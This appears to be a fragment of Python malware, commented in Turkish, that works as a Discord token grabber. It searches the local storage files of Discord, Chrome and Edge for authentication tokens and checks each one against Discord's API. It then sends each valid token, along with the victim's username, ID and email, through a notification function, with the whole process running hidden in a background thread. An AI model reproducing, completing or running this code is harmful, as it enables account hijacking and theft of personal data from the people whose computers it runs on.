# ==========================================
# TOKEN TOPLAMA
# ==========================================
def get_tokens():
    tokens = []
    paths = [
        os.path.join(os.environ["APPDATA"], "Discord", "Local Storage", "leveldb"),
        os.path.join(os.environ["APPDATA"], "discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.environ["APPDATA"], "discordptb", "Local Storage", "leveldb"),
        os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")
    ]
    
    token_pattern = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
    
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    found = re.findall(token_pattern, content)
                    for token in found:
                        if token not in tokens:
                            tokens.append(token)
            except:
                pass
    return tokens

# ==========================================
# TOKEN DOĞRULA VE BİLGİ GÖNDER
# ==========================================
def check_token(token):
    try:
        headers = {"Authorization": token}
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return True, data
        return False, None
    except:
        return False, None

# ==========================================
# ANA İŞLEM
# ==========================================
def main():
    send_notification("🔍 Discord token'ları taranıyor...")
    tokens = get_tokens()
    
    if not tokens:
        send_notification("❌ Token bulunamadı.")
        return
    
    send_notification(f"🔍 {len(tokens)} token bulundu, kontrol ediliyor...")
    
    for token in tokens:
        valid, user_data = check_token(token)
        if valid:
            mesaj = f"""
🍪 **DISCORD TOKEN BULUNDU!**
─────────────────
**Kullanıcı:** `{user_data.get('username')}#{user_data.get('discriminator')}`
**ID:** `{user_data.get('id')}`
**E-posta:** `{user_data.get('email')}`
**Nitro:** `{user_data.get('premium_type', 0) > 0}`
─────────────────
**Token:**
```{token}```
"""
            send_notification(mesaj)
        else:
            send_notification(f"❌ Geçersiz token: {token[:20]}...")

# ==========================================
# ARKA PLANDA ÇALIŞTIR
# ==========================================
Thread(target=main, daemon=True).start()
send_notification("⏳ Discord token grabber arka planda çalışıyor...")
